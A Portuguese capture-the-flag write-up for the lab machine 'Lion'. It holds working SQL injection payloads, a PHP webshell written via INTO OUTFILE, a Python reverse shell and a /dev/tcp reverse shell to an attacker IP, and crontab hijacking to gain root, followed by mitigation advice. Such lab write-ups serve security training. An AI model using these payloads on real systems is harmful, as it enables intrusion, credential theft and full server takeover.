# 🎯 Writeup — Máquina Lion

> **Dificuldade:** Médio | **SO:** Linux | **Tags:** `SQL Injection` · `UNION-Based` · `INTO OUTFILE` · `Webshell` · `Crontab PrivEsc`

---

## 1. Sumário Executivo

O comprometimento total foi alcançado através de uma cadeia de exploração que partiu de uma vulnerabilidade de **SQL Injection UNION-Based** no endpoint de busca da aplicação web. A injeção possibilitou enumerar o banco de dados, extrair credenciais administrativas (hash bcrypt — não crackável), e, aproveitando o privilégio `FILE` do MySQL, escrever uma **webshell PHP** diretamente no servidor via `INTO OUTFILE`. Com a webshell estabelecendo **RCE**, uma reverse shell Python foi obtida. A escalação de privilégios foi realizada via **Crontab Hijacking**: um script shell em `/opt/lion/lion.backup.sh`, pertencente ao cron do `root` e executado a cada minuto, era **gravável pelo usuário comprometido**, permitindo a injeção de uma reverse shell e a obtenção de acesso root total.

---

## 2. Reconhecimento

### 2.1 Scan de Portas

```bash
nmap -p- -T4 --min-rate 1000 <IP_ALVO>
```

**Resultado:**

| Porta | Serviço |
|-------|---------|
| 22    | SSH     |
| 80    | HTTP (Aplicação Web) |
| 111   | rpcbind |
| 3306  | MySQL   |

> ⚠️ MySQL exposto externamente (porta 3306) — superfície de ataque adicional. Acesso externo deve ser bloqueado por firewall.

### 2.2 Enumeração de Diretórios Web (ffuf)

```bash
ffuf -u http://<IP_ALVO>/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc 200,301,302
```

**Resultado relevante:**

| Endpoint | Descrição |
|----------|-----------|
| `/admin` | Painel de administração |
| `/search.php` | Campo de busca — **ponto de injeção** |
| `/includes/` | Diretório com permissão de escrita |

> ℹ️ O campo de login do painel `/admin` **não** era vulnerável a SQLi. O vetor de ataque foi identificado no endpoint de busca `search.php`.

---

## 3. Exploração Web — SQL Injection UNION-Based

### 3.1 Identificação do Ponto de Injeção

O campo de busca em `search.php` revelou comportamento anômalo ao receber input especial. Ao submeter a palavra `teste`, a aplicação retornou a **primeira flag** — indicando reflexão direta do input na query SQL.

A confirmação da injeção foi feita com payloads de UNION:

```sql
' union select 1,2,3,4,5,6#
-- Sem retorno → número de colunas incorreto

' union select 1,2,3,4,5,6,7#
-- Retorno com dados → 7 colunas confirmadas
```

> 🔑 **Coluna 2** refletida na resposta — utilizada como canal de exfiltração dos dados.

### 3.2 Enumeração do Banco de Dados

**Versão do banco:**

```sql
' union select 1,@@version,3,4,5,6,7#
```

```
5.5.68-MariaDB
```

**Nome do banco em uso:**

```sql
' union select 1,database(),3,4,5,6,7#
```

```
news
```

**Tabelas do banco `news`:**

```sql
' union select 1,table_name,3,4,5,6,7 from information_schema.tables where table_schema = 'news'#
```

| Tabela |
|--------|
| `tbladmin` |
| `tblcategory` |
| `tblcomments` |
| `tblpages` |
| `tblposts` |
| `tblsubcategory` |

### 3.3 Extração de Credenciais da Tabela `tbladmin`

**Colunas da tabela:**

```sql
' union select 1,column_name,3,4,5,6,7 from information_schema.columns where table_name = 'tbladmin'#
```

Colunas identificadas: `id`, `AdminUserName`, `AdminPassword`, `AdminEmailid`, `Is_Active`, `CreationDate`, `UpdationDate`.

**Extração das credenciais:**

```sql
' union select 1,concat(AdminUserName,":",AdminPassword),3,4,5,6,7 from tbladmin#
```

**Resultado:**

```
admin:$2y$10$<hash_bcrypt_completo>
```

> **Análise:** Hash bcrypt (`$2y$10$`) — algoritmo lento e resistente a força-bruta por design. Sem dicionário adequado ou GPU dedicada, o crack é inviável. O foco migrou para escrita de webshell via `INTO OUTFILE`.

### 3.4 Webshell via `INTO OUTFILE`

O MySQL possuía o privilégio `FILE` ativo e `secure_file_priv` sem restrições, permitindo a escrita de arquivos no sistema via SQL.

Após testar diretórios com permissão de escrita (`/var/www/html`, `/var/www/html/images`, `/var/www/html/vendor`), o diretório **`/var/www/html/includes`** aceitou a escrita:

```sql
'union select 1,"<?php system($_GET['cmd']) ?>",3,4,5,6,7 into outfile "/var/www/html/includes/cmd.php"#
```

Verificação via browser — o arquivo `cmd.php` foi listado em `/includes/`, confirmando a criação bem-sucedida.

---

## 4. RCE e Obtenção de Reverse Shell

### 4.1 Confirmação de RCE via Webshell

```
http://<IP_ALVO>/includes/cmd.php?cmd=id
```

**Resposta:**

```
uid=48(apache) gid=48(apache) groups=48(apache)
```

### 4.2 Identificação do Python Disponível

```
http://<IP_ALVO>/includes/cmd.php?cmd=whereis python
```

```
python: /usr/bin/python
```

> Python 2 disponível no servidor — utilizado para a reverse shell.

### 4.3 Reverse Shell via Webshell

Configurando o listener:

```bash
nc -lvnp 443
```

Payload enviado via webshell (URL-encoded no browser):

```
http://<IP_ALVO>/includes/cmd.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP_VPN>",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

Conexão recebida como `apache`.

---

## 5. Pós-Exploração — Estabilização do Shell e Flags

### 5.1 Upgrade para TTY Interativo

```bash
python -c "import pty;pty.spawn('/bin/bash')"
# Ctrl+Z
stty raw -echo; fg
# Enter
export TERM=xterm
```

### 5.2 Flags Coletadas

**Flag Web (search.php):** Obtida ao submeter input no campo de busca.

**Flag do Sistema:** Encontrada na raiz `/` do sistema:

```bash
ls /
cat /flag.txt
```

---

## 6. Escalação de Privilégios (PrivEsc) — Crontab Hijacking

### 6.1 Enumeração com LinPEAS

```bash
# Na máquina atacante — iniciar servidor HTTP
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
python3 -m http.server 80

# No servidor comprometido
cd /tmp
wget http://<IP_VPN>/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

O LinPEAS identificou o arquivo `/opt/lion/lion.backup.sh` como um **cron job executado pelo root** com **permissão de escrita** para o usuário atual.

### 6.2 Análise do Cron

```bash
cat /etc/crontab
```

```
* * * * * root /bin/bash /opt/lion/lion.backup.sh
```

> ⏱️ Execução a **cada 1 minuto** com privilégios de `root`.

### 6.3 Injeção do Payload no Script

```bash
cat > /opt/lion/lion.backup.sh << 'EOF'
#!/bin/bash
/bin/bash -c 'sh -i >& /dev/tcp/<IP_VPN>/1337 0>&1'
EOF
```

### 6.4 Gatilho e Exploração

Configurando o listener:

```bash
nc -lvnp 1337
```

Após aguardar até 1 minuto (próxima execução do cron):

```bash
whoami
# root
```

**Flag de Root:** Obtida em `/root/root.txt`.

---

## 7. Diagrama da Cadeia de Ataque

```
[search.php - Campo de Busca]
        │
        ▼
  SQL Injection UNION-Based
  (7 colunas, coluna 2 refletida)
        │
        ├─► Enumeração do banco 'news'
        │       └─► tbladmin → hash bcrypt (não crackado)
        │
        └─► INTO OUTFILE → /var/www/html/includes/cmd.php
                │
                └─► Webshell PHP → RCE como apache
                        │
                        └─► Reverse Shell (Python2) ✅
                                 │
                                 └─► Flag sistema (/)
                                 │
                                 └─► LinPEAS → /opt/lion/lion.backup.sh
                                          │
                                          └─► Cron root (1min) + writable
                                                   │
                                                   └─► Reverse Shell injetada → ROOT ✅
```

---

## 8. Credenciais e Flags

| Item | Valor |
|------|-------|
| **Usuário inicial** | `apache` (via webshell) |
| **Credencial admin** | `admin` / `$2y$10$<hash>` (bcrypt — não crackado) |
| **Flag Web** | (retornada pelo campo de busca) |
| **Flag Sistema** | (em `/flag.txt` na raiz) |
| **Flag Root** | (obtida em `/root/root.txt`) |

---

## 9. Vulnerabilidades Identificadas

| # | Vulnerabilidade | Severidade | CVE/CWE |
|---|-----------------|------------|---------|
| 1 | SQL Injection UNION-Based (`search.php`) | 🔴 Crítico | CWE-89 |
| 2 | MySQL `FILE` privilege + `INTO OUTFILE` sem restrição | 🔴 Crítico | CWE-732 |
| 3 | Escrita de webshell PHP em diretório acessível via HTTP | 🔴 Crítico | CWE-434 |
| 4 | Script de cron do root com permissão de escrita para usuário não-privilegiado | 🔴 Crítico | CWE-732 |
| 5 | MySQL exposto externamente (porta 3306) | 🟠 Alto | CWE-284 |
| 6 | Hash de senha armazenado sem salt adicional ou mecanismo de pepper | 🟡 Médio | CWE-916 |

---

## 10. Ferramentas Utilizadas

| Ferramenta | Uso |
|------------|-----|
| `nmap` | Scan de portas/serviços |
| `ffuf` | Enumeração de diretórios web |
| `Burp Suite` / Browser | Manipulação de payloads SQLi |
| MySQL `UNION` + `INTO OUTFILE` | Enumeração e escrita de webshell |
| `netcat` (`nc`) | Listeners para reverse shells |
| Python 2 (`socket`) | Reverse shell no servidor |
| `linpeas.sh` | Enumeração automatizada de PrivEsc |
| `python3 -m http.server` | Transferência de arquivos para o alvo |

---

## 11. Recomendações de Mitigação

1. **SQL Injection:** Usar Prepared Statements / Queries parametrizadas em todas as interações com o banco. Nunca concatenar input do usuário em queries SQL.
2. **MySQL `FILE` privilege:** Revogar o privilégio `FILE` do usuário da aplicação: `REVOKE FILE ON *.* FROM 'app_user'@'localhost';` Configurar `secure_file_priv` para um diretório restrito ou vazio para bloquear `INTO OUTFILE`.
3. **MySQL exposto externamente:** Bloquear a porta 3306 no firewall para acesso externo: `iptables -A INPUT -p tcp --dport 3306 -s 127.0.0.1 -j ACCEPT; iptables -A INPUT -p tcp --dport 3306 -j DROP`
4. **Webshell / Upload de arquivos:** Garantir que diretórios web não tenham permissão de escrita pelo usuário do servidor (apache/www-data). Configurar o webserver para não executar PHP em diretórios de upload.
5. **Permissões de scripts no cron:** Auditar todos os scripts executados pelo cron como root. Garantir que somente `root` tenha permissão de escrita nesses arquivos: `chmod 700 /opt/lion/lion.backup.sh; chown root:root /opt/lion/lion.backup.sh`
6. **Princípio do menor privilégio:** Separar contas de serviço com permissões mínimas necessárias. Nunca executar scripts de aplicação com o usuário `root`.
